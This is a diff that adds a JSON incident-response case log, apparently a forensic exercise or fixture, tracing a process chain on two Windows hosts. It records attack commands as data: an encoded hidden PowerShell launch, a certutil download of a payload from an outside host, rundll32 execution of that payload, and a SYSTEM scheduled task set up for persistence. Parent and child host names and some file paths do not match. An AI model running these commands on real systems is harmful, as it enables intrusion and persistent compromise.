@@ -1,0 +1,76 @@
+{
+  "case_id": "AURORA-IR-2026-01",
+  "host": "AUR-WS-117",
+  "time_window": {
+    "start": "2026-08-10T02:13:00Z",
+    "end": "2026-08-10T02:30:00Z"
+  },
+  "processes": [
+    {
+      "time": "2026-08-10T02:13:12Z",
+      "process": "explorer.exe",
+      "pid": 2217,
+      "parent_pid": 0,
+      "command": "explorer.exe",
+      "user": "svc_maint",
+      "host": "AUR-WS-117",
+      "path": "C:\\Windows\\explorer.exe",
+      "children": [3421]
+    },
+    {
+      "time": "2026-08-10T02:13:12Z",
+      "process": "powershell.exe",
+      "pid": 3421,
+      "parent_pid": 2217,
+      "command": "powershell.exe -NoP -W hidden -enc SW52b2ljZSA...",
+      "user": "svc_maint",
+      "host": "AUR-WS-117",
+      "path": "C:\\Users\\svc_maint\\AppData\\Temp\\update.ps1",
+      "children": [3470]
+    },
+    {
+      "time": "2026-08-10T02:13:14Z",
+      "process": "certutil.exe",
+      "pid": 3470,
+      "parent_pid": 3421,
+      "command": "certutil -urlcache -split -f http://objects-sync.io/payload.bin C:\\Users\\svc_maint\\AppData\\Local\\Temp\\x.bin",
+      "user": "svc_maint",
+      "host": "AUR-WS-117",
+      "path": "C:\\Windows\\System32\\certutil.exe",
+      "children": [3490]
+    },
+    {
+      "time": "2026-08-10T02:13:18Z",
+      "process": "rundll32.exe",
+      "pid": 3490,
+      "parent_pid": 3470,
+      "command": "rundll32.exe C:\\Users\\svc_maint\\AppData\\Local\\Temp\\x.bin,Run",
+      "user": "svc_maint",
+      "host": "AUR-WS-117",
+      "path": "C:\\Windows\\System32\\rundll32.exe",
+      "children": []
+    },
+    {
+      "time": "2026-08-10T02:23:30Z",
+      "process": "cmd.exe",
+      "pid": 4088,
+      "parent_pid": 3490,
+      "command": "cmd /c schtasks /create /sc onstart /tn \"sys_update_win\" /tr \"powershell -w hidden -nop -c ...\" /ru SYSTEM",
+      "user": "svc_maint",
+      "host": "AUR-FILE-01",
+      "path": "C:\\Windows\\System32\\cmd.exe",
+      "children": [4095]
+    },
+    {
+      "time": "2026-08-10T02:23:32Z",
+      "process": "rundll32.exe",
+      "pid": 4095,
+      "parent_pid": 4088,
+      "command": "rundll32.exe C:\\ProgramData\\Microsoft\\Windows\\system32\\newtask.dll,Run",
+      "user": "svc_maint",
+      "host": "AUR-FILE-01",
+      "path": "C:\\Windows\\System32\\rundll32.exe",
+      "children": []
+    }
+  ]
+}
